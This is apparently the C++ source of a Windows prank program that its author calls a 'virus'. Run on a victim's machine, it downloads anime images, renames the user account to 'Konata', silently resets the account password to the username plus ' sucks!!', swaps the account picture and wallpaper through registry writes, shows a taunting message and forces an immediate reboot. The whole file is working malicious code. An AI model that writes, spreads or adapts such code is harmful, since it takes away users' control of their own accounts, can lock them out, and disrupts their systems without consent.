#include <windows.h>
#include <wininet.h>
#include <userenv.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <lmcons.h>
#include <lm.h>
#include <shlobj.h>
#include <sddl.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

namespace fs = std::filesystem;

bool DownloadFile(const std::wstring& url, const std::wstring& destination) {
    HINTERNET hInternet = InternetOpen(L"Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hFile = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return false;
    }

    HANDLE hDestFile = CreateFile(destination.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDestFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD bytesWritten;
        WriteFile(hDestFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    CloseHandle(hDestFile);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return true;
}

bool CustomizeCurrentUser() {
    WCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);

    std::wstring originalName = username;
    std::wstring newPassword = originalName + L" sucks!!";

    WCHAR exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring exeDir = std::wstring(exePath);
    exeDir = exeDir.substr(0, exeDir.find_last_of(L"\\/"));

    std::wstring pfpPath = exeDir + L"\\konata_pfp.jpg";
    std::wstring wallpaperPath = exeDir + L"\\konata_wallpaper.jpg";

    if (!DownloadFile(L"https://avatarfiles.alphacoders.com/337/337478.jpg", pfpPath) ||
        !DownloadFile(L"https://i.imgur.com/WNZoQ.jpeg", wallpaperPath)) {
        MessageBox(NULL, L"Failed to download required files. Please check your internet connection.", L"Error", MB_ICONERROR | MB_OK);
        return false;
    }

    USER_INFO_1011 nameInfo;
    nameInfo.usri1011_full_name = const_cast<LPWSTR>(L"Konata");
    NetUserSetInfo(NULL, username, 1011, (LPBYTE)&nameInfo, NULL);

    USER_INFO_1003 passInfo;
    passInfo.usri1003_password = const_cast<LPWSTR>(newPassword.c_str());
    NetUserSetInfo(NULL, username, 1003, (LPBYTE)&passInfo, NULL);

    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    DWORD tokenSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenSize);
    std::vector<BYTE> tokenData(tokenSize);
    GetTokenInformation(hToken, TokenUser, tokenData.data(), tokenSize, &tokenSize);
    PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(tokenData.data());
    
    LPWSTR sidString;
    ConvertSidToStringSidW(pTokenUser->User.Sid, &sidString);
    CloseHandle(hToken);

    WCHAR profilePath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, profilePath);
    std::wstring basePath = std::wstring(profilePath) + L"\\AppData\\Local\\Microsoft\\Windows\\Account\\";
    fs::create_directories(basePath);

    std::vector<int> sizes = { 32, 40, 48, 96, 192, 200, 240, 448 };
    for (int size : sizes) {
        std::wstring sizePath = basePath + L"konata" + std::to_wstring(size) + L".jpg";
        fs::copy_file(pfpPath, sizePath, fs::copy_options::overwrite_existing);
    }

    HKEY hKey;
    std::wstring regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AccountPicture\\Users\\" + std::wstring(sidString);
    LocalFree(sidString); 

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        for (int size : sizes) {
            std::wstring valueName = L"Image" + std::to_wstring(size);
            std::wstring imagePath = basePath + L"konata" + std::to_wstring(size) + L".jpg";
            RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ, (BYTE*)imagePath.c_str(), (imagePath.length() + 1) * sizeof(wchar_t));
        }
        RegCloseKey(hKey);
    }

    std::wstring wallpaperDestPath = std::wstring(profilePath) + L"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\TranscodedWallpaper";
    fs::create_directories(fs::path(wallpaperDestPath).parent_path());
    fs::copy_file(wallpaperPath, wallpaperDestPath, fs::copy_options::overwrite_existing);

    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WallPaper", 0, REG_SZ, (BYTE*)wallpaperDestPath.c_str(), (wallpaperDestPath.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    DeleteFile(pfpPath.c_str());
    DeleteFile(wallpaperPath.c_str());

    return true;
}

int main() {
    if (CustomizeCurrentUser()) {
        MessageBox(NULL, L"You suck!! - 'virus' by maybekoi!", L"Konata", MB_ICONINFORMATION | MB_OK);
        system("shutdown /r /t 0");
    }
    return 0;
}
